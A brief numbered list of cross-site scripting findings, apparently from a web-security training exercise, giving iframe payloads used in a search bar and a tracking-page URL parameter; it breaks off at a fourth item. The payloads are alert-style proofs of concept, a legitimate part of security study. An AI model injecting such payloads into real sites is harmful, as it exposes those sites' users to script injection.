
1.  DOM XSS - Found in search bar. By using Payload- <iframe src="javascript:alert(`xss`)">.

2. Bonus Payload DOM XSS- Found in search bar. By using Payload- <iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true"></iframe>

3. Reflected XSS- Found in tracking page by changing the URL Parameter by the payload- <iframe src="javascript:alert(`xss`)">

4. Client 